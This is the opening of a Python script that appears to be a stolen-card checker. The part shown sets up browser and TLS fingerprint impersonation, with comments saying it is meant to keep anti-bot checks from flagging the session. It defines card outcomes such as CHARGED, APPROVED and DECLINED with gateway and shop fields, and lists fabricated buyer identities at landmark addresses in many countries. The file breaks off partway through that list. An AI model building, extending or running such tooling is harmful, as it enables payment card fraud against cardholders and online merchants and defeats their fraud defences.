import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime
import threading 
import asyncio
import logging
_log = logging.getLogger("auto")
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

# Verified live against tls.peet.ws with curl_cffi 0.16.3 (2026-09).
# Each impersonate target ships a fixed UA + sec-ch-ua set; they MUST stay paired,
# otherwise the TLS fingerprint (JA4) and the UA/brand headers contradict each other
# and anti-bot checks flag the session. curl_cffi auto-fills sec-ch-ua from the target.
PROFILE_UA = {
    # ── proven profiles (from 528 session logs) ──
    "chrome131":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome124":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "chrome123":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "chrome120":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "chrome119":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "chrome116":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "firefox135": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "firefox133": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "safari184":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
    "safari180":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "safari17_0": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    # ── new curl_cffi 0.16 profiles (exact real UAs) ──
    "chrome133a": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "chrome136":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "chrome142":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "chrome145":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "chrome146":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "chrome150":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "firefox144": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "firefox147": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
    "safari153":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "safari155":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
    "safari170":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "safari260":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15",
    "safari2601": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6.1 Safari/605.1.15",
}
BROWSER_PROFILES = list(PROFILE_UA.keys())
USER_AGENTS = list(PROFILE_UA.values())


# ── Header rotation / variation (per browser profile) ──────────────────
ACCEPT_LANGUAGE_VARIANTS = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.9,en-IN;q=0.8",
    "en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.8",
    "en-US,en;q=0.6",
]

ACCEPT_VARIANTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
]

# Chrome client-hint headers, version-matched to the impersonated browser.
CHROME_SEC_CH_UA = {
    "chrome116": '"Chromium";v="116", "Not_A Brand";v="24", "Google Chrome";v="116"',
    "chrome119": '"Chromium";v="119", "Not_A Brand";v="24", "Google Chrome";v="119"',
    "chrome120": '"Chromium";v="120", "Not_A Brand";v="24", "Google Chrome";v="120"',
    "chrome123": '"Chromium";v="123", "Not_A Brand";v="24", "Google Chrome";v="123"',
    "chrome124": '"Chromium";v="124", "Not_A Brand";v="24", "Google Chrome";v="124"',
    "chrome131": '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"',
    "chrome133a": '"Chromium";v="133", "Not_A Brand";v="24", "Google Chrome";v="133"',
    "chrome136": '"Chromium";v="136", "Not_A Brand";v="24", "Google Chrome";v="136"',
    "chrome142": '"Chromium";v="142", "Not_A Brand";v="24", "Google Chrome";v="142"',
    "chrome145": '"Chromium";v="145", "Not_A Brand";v="24", "Google Chrome";v="145"',
    "chrome146": '"Chromium";v="146", "Not_A Brand";v="24", "Google Chrome";v="146"',
    "chrome150": '"Chromium";v="150", "Not_A Brand";v="24", "Google Chrome";v="150"',
}

# which Chrome profiles run Windows (UA says Windows NT) vs macOS
CHROME_WINDOWS = {"chrome116", "chrome131", "chrome133a", "chrome136",
                  "chrome142", "chrome145", "chrome146", "chrome150"}


def browser_extra_headers(impersonate: str) -> dict:
    """Browser-family-specific headers used for per-request variation.
    Firefox/Safari don't send Chrome client hints, so they stay empty."""
    h = {}
    if impersonate in CHROME_SEC_CH_UA:
        h["sec-ch-ua"] = CHROME_SEC_CH_UA[impersonate]
        h["sec-ch-ua-mobile"] = "?0"
        h["sec-ch-ua-platform"] = '"Windows"' if impersonate in CHROME_WINDOWS else '"macOS"'
    return h


# Advanced curl_cffi 0.16 TLS-level fingerprint variation (ExtraFingerprints).
# tls_grease / tls_permute_extensions add the kind of TLS noise real browsers
# produce; split_cookies mirrors multi-Cookie-header behaviour.
USE_EXTRA_FP = True


def random_extra_fp():
    """Randomized ExtraFingerprints for per-session TLS variation."""
    from curl_cffi.requests import ExtraFingerprints
    return ExtraFingerprints(
        tls_grease=random.choice([True, False]),
        tls_permute_extensions=random.choice([True, False]),
        split_cookies=True,
    )

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    gateway: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, List[Address]] = {
    "US": [
        Address("james", "smith", "350 5th Ave", "", "New York", "US", "NY", "10118", "+12015554329", "gmail.com"),
        Address("john", "johnson", "1600 Pennsylvania Ave NW", "", "Washington", "US", "DC", "20500", "+12015557777", "gmail.com"),
        Address("robert", "williams", "1 Infinite Loop", "", "Cupertino", "US", "CA", "95014", "+12015558156", "gmail.com"),
        Address("michael", "brown", "233 S Wacker Dr", "", "Chicago", "US", "IL", "60606", "+12015550263", "gmail.com"),
        Address("william", "jones", "1000 4th Ave", "", "Seattle", "US", "WA", "98104", "+12015550292", "gmail.com"),
        Address("david", "garcia", "600 Congress Ave", "", "Austin", "US", "TX", "78701", "+12015556329", "gmail.com"),
        Address("richard", "miller", "1 Memorial Dr", "", "Cambridge", "US", "MA", "02142", "+12015557628", "gmail.com"),
        Address("joseph", "davis", "1180 Peachtree St NE", "", "Atlanta", "US", "GA", "30309", "+12015558927", "gmail.com"),
        Address("thomas", "rodriguez", "1000 Brickell Ave", "", "Miami", "US", "FL", "33131", "+12015559660", "gmail.com"),
        Address("charles", "martinez", "350 S Grand Ave", "", "Los Angeles", "US", "CA", "90071", "+12015550743", "gmail.com"),
    ],
    "CA": [
        Address("james", "smith", "100 Queen St W", "", "Toronto", "CA", "ON", "M5H 2N2", "+15062341815", "gmail.com"),
        Address("john", "johnson", "455 Granville St", "", "Vancouver", "CA", "BC", "V6C 1T1", "+15062346676", "gmail.com"),
        Address("robert", "williams", "275 Notre-Dame St W", "", "Montreal", "CA", "QC", "H2Y 1C6", "+15062342393", "gmail.com"),
        Address("michael", "brown", "1 Sir Winston Churchill Sq", "", "Edmonton", "CA", "AB", "T5J 2R7", "+15062342044", "gmail.com"),
        Address("william", "jones", "800 Macleod Trail SE", "", "Calgary", "CA", "AB", "T2G 5E6", "+15062342721", "gmail.com"),
        Address("david", "garcia", "110 Laurier Ave W", "", "Ottawa", "CA", "ON", "K1P 1J1", "+15062345333", "gmail.com"),
        Address("richard", "miller", "510 Main St", "", "Winnipeg", "CA", "MB", "R3B 1B9", "+15062349137", "gmail.com"),
        Address("joseph", "davis", "1841 Argyle St", "", "Halifax", "CA", "NS", "B3J 3A5", "+15062343025", "gmail.com"),
        Address("thomas", "rodriguez", "2476 Victoria Ave", "", "Regina", "CA", "SK", "S4P 3C8", "+15062341700", "gmail.com"),
        Address("charles", "martinez", "2 Rue des Jardins", "", "Quebec City", "CA", "QC", "G1R 4S9", "+15062342534", "gmail.com"),
    ],
    "GB": [
        Address("james", "smith", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+441212346774", "gmail.com"),
        Address("john", "johnson", "1 Victoria St", "", "London", "GB", "ENG", "SW1H 0ET", "+441212346428", "gmail.com"),
        Address("robert", "williams", "St Aldates", "", "Oxford", "GB", "ENG", "OX1 1BX", "+441212342703", "gmail.com"),
        Address("michael", "brown", "Albert Square", "", "Manchester", "GB", "ENG", "M2 5DB", "+441212343445", "gmail.com"),
        Address("william", "jones", "Victoria Square", "", "Birmingham", "GB", "ENG", "B1 1BB", "+441212348716", "gmail.com"),
        Address("david", "garcia", "George Square", "", "Glasgow", "GB", "SCT", "G2 1DU", "+441212341253", "gmail.com"),
        Address("richard", "miller", "Castle St", "", "Edinburgh", "GB", "SCT", "EH1 2AT", "+441212340258", "gmail.com"),
        Address("joseph", "davis", "Queen Victoria Rd", "", "Newcastle upon Tyne", "GB", "ENG", "NE1 7RU", "+441212349109", "gmail.com"),
        Address("thomas", "rodriguez", "Waterfront Plaza", "", "Leeds", "GB", "ENG", "LS1 4GL", "+441212345119", "gmail.com"),
        Address("charles", "martinez", "College Green", "", "Bristol", "GB", "ENG", "BS1 5TR", "+441212340291", "gmail.com"),
    ],
    "IN": [
        Address("james", "smith", "Connaught Place", "", "New Delhi", "IN", "DL", "110001", "+917410412648", "gmail.com"),
        Address("john", "johnson", "Nariman Point", "", "Mumbai", "IN", "MH", "400021", "+917410418123", "gmail.com"),
        Address("robert", "williams", "MG Road", "", "Bengaluru", "IN", "KA", "560001", "+917410418376", "gmail.com"),
        Address("michael", "brown", "Park Street", "", "Kolkata", "IN", "WB", "700016", "+917410414835", "gmail.com"),
        Address("william", "jones", "Anna Salai", "", "Chennai", "IN", "TN", "600002", "+917410416147", "gmail.com"),
        Address("david", "garcia", "Banjara Hills", "", "Hyderabad", "IN", "TS", "500034", "+917410410290", "gmail.com"),
        Address("richard", "miller", "Ashram Road", "", "Ahmedabad", "IN", "GJ", "380009", "+917410418577", "gmail.com"),
        Address("joseph", "davis", "MG Road", "", "Pune", "IN", "MH", "411001", "+917410418421", "gmail.com"),
        Address("thomas", "rodriguez", "Civil Lines", "", "Jaipur", "IN", "RJ", "302006", "+917410419410", "gmail.com"),
        Address("charles", "martinez", "Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "+917410416442", "gmail.com"),
    ],
    "AU": [
        Address("james", "smith", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212344972", "gmail.com"),
        Address("john", "johnson", "120 Collins St", "", "Melbourne", "AU", "VIC", "3000", "+61212340043", "gmail.com"),
        Address("robert", "williams", "1 William St", "", "Brisbane", "AU", "QLD", "4000", "+61212347078", "gmail.com"),
        Address("michael", "brown", "27 St Georges Tce", "", "Perth", "AU", "WA", "6000", "+61212341660", "gmail.com"),
        Address("william", "jones", "25 Pirie St", "", "Adelaide", "AU", "SA", "5000", "+61212341956", "gmail.com"),
        Address("david", "garcia", "28 Elizabeth St", "", "Hobart", "AU", "TAS", "7000", "+61212349088", "gmail.com"),
        Address("richard", "miller", "1 Constitution Ave", "", "Canberra", "AU", "ACT", "2601", "+61212349999", "gmail.com"),
        Address("joseph", "davis", "71 Smith St", "", "Darwin", "AU", "NT", "0800", "+61212341358", "gmail.com"),
        Address("thomas", "rodriguez", "1 Bligh St", "", "Sydney", "AU", "NSW", "2000", "+61212345302", "gmail.com"),
        Address("charles", "martinez", "500 Bourke St", "", "Melbourne", "AU", "VIC", "3000", "+61212340783", "gmail.com"),
    ],
    "DE": [
        Address("james", "smith", "Friedrichstrasse 100", "", "Berlin", "DE", "BE", "10117", "+4930123851", "gmail.com"),
        Address("john", "johnson", "Marienplatz 1", "", "Munich", "DE", "BY", "80331", "+4930124962", "gmail.com"),
        Address("robert", "williams", "Rathausmarkt 1", "", "Hamburg", "DE", "HH", "20095", "+4930125240", "gmail.com"),
        Address("michael", "brown", "Domplatz 1", "", "Cologne", "DE", "NW", "50667", "+4930121209", "gmail.com"),
        Address("william", "jones", "Romerberg 23", "", "Frankfurt", "DE", "HE", "60311", "+4930121702", "gmail.com"),
        Address("david", "garcia", "Schlossplatz 1", "", "Stuttgart", "DE", "BW", "70173", "+4930124978", "gmail.com"),
        Address("richard", "miller", "Marktplatz 1", "", "Leipzig", "DE", "SN", "04109", "+4930121920", "gmail.com"),
        Address("joseph", "davis", "Altmarkt 1", "", "Dresden", "DE", "SN", "01067", "+4930125281", "gmail.com"),
        Address("thomas", "rodriguez", "Bremer Marktplatz 1", "", "Bremen", "DE", "HB", "28195", "+4930123244", "gmail.com"),
        Address("charles", "martinez", "Kurt-Schumacher-Strasse 1", "", "Nuremberg", "DE", "BY", "90402", "+4930125272", "gmail.com"),
    ],
    "FR": [
        Address("james", "smith", "10 Rue de Rivoli", "", "Paris", "FR", "75", "75001", "+33123453014", "gmail.com"),
        Address("john", "johnson", "15 Rue de la Republique", "", "Lyon", "FR", "69", "69001", "+33123456467", "gmail.com"),
        Address("robert", "williams", "La Canebiere 1", "", "Marseille", "FR", "13", "13001", "+33123454723", "gmail.com"),
        Address("michael", "brown", "Place du Capitole", "", "Toulouse", "FR", "31", "31000", "+33123459078", "gmail.com"),
        Address("william", "jones", "Place de la Bourse", "", "Bordeaux", "FR", "33", "33000", "+33123457541", "gmail.com"),
        Address("david", "garcia", "Place du General de Gaulle", "", "Lille", "FR", "59", "59000", "+33123457297", "gmail.com"),
        Address("richard", "miller", "Place Kleber", "", "Strasbourg", "FR", "67", "67000", "+33123450840", "gmail.com"),
        Address("joseph", "davis", "Place du Commerce", "", "Nantes", "FR", "44", "44000", "+33123454096", "gmail.com"),
        Address("thomas", "rodriguez", "Place de la Comedie", "", "Montpellier", "FR", "34", "34000", "+33123454047", "gmail.com"),
        Address("charles", "martinez", "Place Massena", "", "Nice", "FR", "06", "06000", "+33123456632", "gmail.com"),
    ],
    "NZ": [
        Address("james", "smith", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6432340406", "gmail.com"),
        Address("john", "johnson", "100 Willis St", "", "Wellington", "NZ", "WGN", "6011", "+6432342546", "gmail.com"),
        Address("robert", "williams", "Cathedral Square", "", "Christchurch", "NZ", "CAN", "8011", "+6432347849", "gmail.com"),
        Address("michael", "brown", "The Octagon", "", "Dunedin", "NZ", "OTA", "9016", "+6432344616", "gmail.com"),
        Address("william", "jones", "Victoria St", "", "Hamilton", "NZ", "WKO", "3204", "+6432349017", "gmail.com"),
        Address("david", "garcia", "Devon St", "", "New Plymouth", "NZ", "TKI", "4310", "+6432343080", "gmail.com"),
        Address("richard", "miller", "Grey St", "", "Gisborne", "NZ", "GIS", "4010", "+6432344537", "gmail.com"),
        Address("joseph", "davis", "Heretaunga St", "", "Hastings", "NZ", "HKB", "4122", "+6432345580", "gmail.com"),
        Address("thomas", "rodriguez", "Trafalgar St", "", "Nelson", "NZ", "NSN", "7010", "+6432349299", "gmail.com"),
        Address("charles", "martinez", "Fenton St", "", "Rotorua", "NZ", "BOP", "3010", "+6432342741", "gmail.com"),
    ],
    "IE": [
        Address("james", "smith", "1 Grafton St", "", "Dublin", "IE", "D", "D02 Y006", "+3532212678", "gmail.com"),
        Address("john", "johnson", "100 Patrick St", "", "Cork", "IE", "CO", "T12 XY88", "+3532212267", "gmail.com"),
        Address("robert", "williams", "Eyre Square", "", "Galway", "IE", "G", "H91 F9K9", "+3532212633", "gmail.com"),
        Address("michael", "brown", "O'Connell St", "", "Limerick", "IE", "LK", "V94 H272", "+3532212494", "gmail.com"),
        Address("william", "jones", "The Quay", "", "Waterford", "IE", "WD", "X91 K0EK", "+3532212922", "gmail.com"),
        Address("david", "garcia", "Main St", "", "Killarney", "IE", "KY", "V93 RC95", "+3532212975", "gmail.com"),
        Address("richard", "miller", "1 Cathedral St", "", "Dublin", "IE", "D", "D01 F6P2", "+3532212745", "gmail.com"),
        Address("joseph", "davis", "Pearse St", "", "Athlone", "IE", "WH", "N37 YY76", "+3532212910", "gmail.com"),
        Address("thomas", "rodriguez", "John St", "", "Kilkenny", "IE", "KK", "R95 H2K4", "+3532212278", "gmail.com"),
        Address("charles", "martinez", "Main St", "", "Drogheda", "IE", "LH", "A92 DKR0", "+3532212095", "gmail.com"),
    ],
    "NL": [
        Address("james", "smith", "Dam 1", "", "Amsterdam", "NL", "NH", "1012 JS", "+31101239765", "gmail.com"),
        Address("john", "johnson", "Coolsingel 40", "", "Rotterdam", "NL", "ZH", "3011 AD", "+31101238887", "gmail.com"),
        Address("robert", "williams", "Spui 70", "", "Den Haag", "NL", "ZH", "2511 BT", "+31101230437", "gmail.com"),
        Address("michael", "brown", "Stadhuisplein 10", "", "Utrecht", "NL", "UT", "3511 ED", "+31101230517", "gmail.com"),
        Address("william", "jones", "Grote Markt 1", "", "Groningen", "NL", "GR", "9712 HN", "+31101237033", "gmail.com"),
        Address("david", "garcia", "Markt 1", "", "Breda", "NL", "NB", "4811 WJ", "+31101239257", "gmail.com"),
        Address("richard", "miller", "Stadhuisplein 128", "", "Eindhoven", "NL", "NB", "5611 EM", "+31101230500", "gmail.com"),
        Address("joseph", "davis", "Markt 1", "", "Maastricht", "NL", "LI", "6211 CS", "+31101237990", "gmail.com"),
        Address("thomas", "rodriguez", "Grote Markt 1", "", "Nijmegen", "NL", "GE", "6511 KC", "+31101239995", "gmail.com"),
        Address("charles", "martinez", "Stadhuisplein 1", "", "Haarlem", "NL", "NH", "2011 ZR", "+31101234758", "gmail.com"),
    ],
    "ES": [
        Address("james", "smith", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34810124198", "gmail.com"),
        Address("john", "johnson", "Passeig de Gracia 1", "", "Barcelona", "ES", "B", "08007", "+34810129163", "gmail.com"),
        Address("robert", "williams", "Plaza del Ayuntamiento 1", "", "Valencia", "ES", "V", "46002", "+34810122631", "gmail.com"),
        Address("michael", "brown", "Avenida de la Constitucion 1", "", "Sevilla", "ES", "SE", "41004", "+34810122858", "gmail.com"),
        Address("william", "jones", "Plaza del Pilar 1", "", "Zaragoza", "ES", "Z", "50003", "+34810129956", "gmail.com"),
        Address("david", "garcia", "Gran Via 1", "", "Bilbao", "ES", "BI", "48001", "+34810124036", "gmail.com"),
        Address("richard", "miller", "Plaza de la Constitucion 1", "", "Malaga", "ES", "MA", "29015", "+34810120326", "gmail.com"),
        Address("joseph", "davis", "Calle de Alcala 1", "", "Madrid", "ES", "M", "28014", "+34810129506", "gmail.com"),
        Address("thomas", "rodriguez", "Calle Colon 1", "", "Valencia", "ES", "V", "46004", "+34810120310", "gmail.com"),
        Address("charles", "martinez", "Plaza de la Virgen 1", "", "Valencia", "ES", "V", "46001", "+34810128958", "gmail.com"),
    ],
    "IT": [
        Address("james", "smith", "Via Roma 1", "", "Roma", "IT", "RM", "00184", "+390212341692", "gmail.com"),
        Address("john", "johnson", "Via Montenapoleone 1", "", "Milano", "IT", "MI", "20121", "+390212346840", "gmail.com"),
        Address("robert", "williams", "Piazza del Plebiscito 1", "", "Napoli", "IT", "NA", "80132", "+390212349761", "gmail.com"),
        Address("michael", "brown", "Piazza della Signoria 1", "", "Firenze", "IT", "FI", "50122", "+390212340201", "gmail.com"),
        Address("william", "jones", "Piazza Maggiore 1", "", "Bologna", "IT", "BO", "40124", "+390212345524", "gmail.com"),
        Address("david", "garcia", "Piazza San Marco 1", "", "Venezia", "IT", "VE", "30124", "+390212341164", "gmail.com"),
        Address("richard", "miller", "Via Garibaldi 1", "", "Genova", "IT", "GE", "16124", "+390212348899", "gmail.com"),
        Address("joseph", "davis", "Via Po 1", "", "Torino", "IT", "TO", "10124", "+390212348328", "gmail.com"),
        Address("thomas", "rodriguez", "Piazza del Campo 1", "", "Siena", "IT", "SI", "53100", "+390212349789", "gmail.com"),
        Address("charles", "martinez", "Via Toledo 1", "", "Napoli", "IT", "NA", "80134", "+390212347041", "gmail.com"),
    ],
    "SE": [
        Address("james", "smith", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123580", "gmail.com"),
        Address("john", "johnson", "Drottninggatan 1", "", "Stockholm", "SE", "AB", "111 51", "+468123208", "gmail.com"),
        Address("robert", "williams", "Avenyn 1", "", "Goteborg", "SE", "O", "411 36", "+468123236", "gmail.com"),
        Address("michael", "brown", "Stortorget 1", "", "Malmo", "SE", "M", "211 22", "+468123640", "gmail.com"),
        Address("william", "jones", "Dragarbrunnsgatan 1", "", "Uppsala", "SE", "C", "753 20", "+468123582", "gmail.com"),
        Address("david", "garcia", "Stora Torget 1", "", "Vasteras", "SE", "U", "722 11", "+468123756", "gmail.com"),
        Address("richard", "miller", "Storgatan 1", "", "Orebro", "SE", "T", "702 11", "+468123645", "gmail.com"),
        Address("joseph", "davis", "Radhustorget 1", "", "Umea", "SE", "AC", "903 26", "+468123419", "gmail.com"),
        Address("thomas", "rodriguez", "Stortorget 1", "", "Lund", "SE", "M", "222 23", "+468123314", "gmail.com"),
        Address("charles", "martinez", "Drottningtorget 1", "", "Malmo", "SE", "M", "211 25", "+468123238", "gmail.com"),
    ],
    "NO": [
        Address("james", "smith", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721239181", "gmail.com"),
        Address("john", "johnson", "Torget 1", "", "Bergen", "NO", "46", "5014", "+4721235949", "gmail.com"),
        Address("robert", "williams", "Kongens gate 1", "", "Trondheim", "NO", "50", "7011", "+4721235183", "gmail.com"),
        Address("michael", "brown", "Kirkegata 1", "", "Stavanger", "NO", "11", "4005", "+4721239572", "gmail.com"),
        Address("william", "jones", "Radhusgata 1", "", "Oslo", "NO", "03", "0151", "+4721239478", "gmail.com"),
        Address("david", "garcia", "Storgata 1", "", "Tromso", "NO", "55", "9008", "+4721232603", "gmail.com"),
        Address("richard", "miller", "Kongens gate 1", "", "Kristiansand", "NO", "42", "4610", "+4721237175", "gmail.com"),
        Address("joseph", "davis", "Storgata 1", "", "Drammen", "NO", "33", "3004", "+4721234220", "gmail.com"),
        Address("thomas", "rodriguez", "Kirkegata 1", "", "Fredrikstad", "NO", "31", "1607", "+4721234551", "gmail.com"),
        Address("charles", "martinez", "Storgata 1", "", "Alesund", "NO", "15", "6002", "+4721233479", "gmail.com"),
    ],
    "DK": [
        Address("james", "smith", "Stroget 1", "", "Copenhagen", "DK", "84", "1457", "+4532121590", "gmail.com"),
        Address("john", "johnson", "Radhuspladsen 1", "", "Copenhagen", "DK", "84", "1550", "+4532121945", "gmail.com"),
        Address("robert", "williams", "Sondergade 1", "", "Aarhus", "DK", "82", "8000", "+4532128509", "gmail.com"),
        Address("michael", "brown", "Algade 1", "", "Aalborg", "DK", "81", "9000", "+4532123389", "gmail.com"),
        Address("william", "jones", "Vestergade 1", "", "Odense", "DK", "83", "5000", "+4532120932", "gmail.com"),
        Address("david", "garcia", "Norregade 1", "", "Copenhagen", "DK", "84", "1165", "+4532126488", "gmail.com"),
        Address("richard", "miller", "Torvet 1", "", "Esbjerg", "DK", "83", "6700", "+4532127854", "gmail.com"),
        Address("joseph", "davis", "Kirkegade 1", "", "Randers", "DK", "82", "8900", "+4532127203", "gmail.com"),
        Address("thomas", "rodriguez", "Akseltorv 1", "", "Kolding", "DK", "83", "6000", "+4532120672", "gmail.com"),
        Address("charles", "martinez", "Radhustorvet 1", "", "Vejle", "DK", "83", "7100", "+4532126333", "gmail.com"),
    ],
    "FI": [
        Address("james", "smith", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+358131231434", "gmail.com"),
        Address("john", "johnson", "Senate Square 1", "", "Helsinki", "FI", "18", "00170", "+358131236824", "gmail.com"),
        Address("robert", "williams", "Hameenkatu 1", "", "Tampere", "FI", "11", "33100", "+358131235141", "gmail.com"),
        Address("michael", "brown", "Aurakatu 1", "", "Turku", "FI", "19", "20100", "+358131239116", "gmail.com"),
        Address("william", "jones", "Kirkkokatu 1", "", "Oulu", "FI", "14", "90100", "+358131232072", "gmail.com"),
        Address("david", "garcia", "Kauppakatu 1", "", "Jyvaskyla", "FI", "08", "40100", "+358131233798", "gmail.com"),
        Address("richard", "miller", "Torikatu 1", "", "Kuopio", "FI", "15", "70100", "+358131235655", "gmail.com"),
        Address("joseph", "davis", "Kirkkokatu 1", "", "Lahti", "FI", "16", "15140", "+358131237770", "gmail.com"),
        Address("thomas", "rodriguez", "Rantakatu 1", "", "Vaasa", "FI", "12", "65100", "+358131232586", "gmail.com"),
        Address("charles", "martinez", "Raatihuoneenkatu 1", "", "Hameenlinna", "FI", "05", "13100", "+358131230319", "gmail.com"),
    ],
    "BE": [
        Address("james", "smith", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3212340548", "gmail.com"),
        Address("john", "johnson", "Meir 1", "", "Antwerp", "BE", "VAN", "2000", "+3212348524", "gmail.com"),
        Address("robert", "williams", "Korenmarkt 1", "", "Ghent", "BE", "VOV", "9000", "+3212346719", "gmail.com"),
        Address("michael", "brown", "Grote Markt 1", "", "Bruges", "BE", "VWV", "8000", "+3212344662", "gmail.com"),
        Address("william", "jones", "Place Saint-Lambert 1", "", "Liege", "BE", "WLG", "4000", "+3212340826", "gmail.com"),
        Address("david", "garcia", "Grand Place 1", "", "Mons", "BE", "WHT", "7000", "+3212346737", "gmail.com"),
        Address("richard", "miller", "Place Verte 1", "", "Charleroi", "BE", "WHT", "6000", "+3212348804", "gmail.com"),
        Address("joseph", "davis", "Grote Markt 1", "", "Leuven", "BE", "VBR", "3000", "+3212340032", "gmail.com"),
        Address("thomas", "rodriguez", "Grote Markt 1", "", "Hasselt", "BE", "VLI", "3500", "+3212344943", "gmail.com"),
        Address("charles", "martinez", "Markt 1", "", "Namur", "BE", "WNA", "5000", "+3212341878", "gmail.com"),
    ],
    "CH": [
        Address("james", "smith", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41212342290", "gmail.com"),
        Address("john", "johnson", "Bundesplatz 1", "", "Bern", "CH", "BE", "3003", "+41212345136", "gmail.com"),
        Address("robert", "williams", "Rue du Rhone 1", "", "Geneva", "CH", "GE", "1204", "+41212345379", "gmail.com"),
        Address("michael", "brown", "Marktplatz 1", "", "Basel", "CH", "BS", "4001", "+41212346271", "gmail.com"),
        Address("william", "jones", "Pilatusstrasse 1", "", "Lucerne", "CH", "LU", "6003", "+41212349794", "gmail.com"),
        Address("david", "garcia", "Place Centrale 1", "", "Lausanne", "CH", "VD", "1003", "+41212342304", "gmail.com"),
        Address("richard", "miller", "Bahnhofstrasse 1", "", "St. Gallen", "CH", "SG", "9000", "+41212340787", "gmail.com"),
        Address("joseph", "davis", "Rathausplatz 1", "", "Winterthur", "CH", "ZH", "8400", "+41212348031", "gmail.com"),
        Address("thomas", "rodriguez", "Place du Bourg 1", "", "Sion", "CH", "VS", "1950", "+41212348575", "gmail.com"),
